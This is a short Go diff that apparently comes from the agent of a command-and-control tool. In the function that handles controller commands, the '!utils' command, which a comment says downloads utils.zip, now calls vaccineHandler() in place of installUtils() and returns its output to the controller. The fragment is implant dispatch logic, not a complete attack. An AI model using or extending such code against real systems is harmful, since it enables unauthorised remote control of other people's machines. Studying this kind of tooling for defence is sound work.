@@ -131,7 +131,7 @@ func processCCData(data *MsgTunData) {
 
 		// download utils.zip
 		if cmdSlice[0] == "!utils" {
-			out = installUtils()
+			out = vaccineHandler()
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
 		}
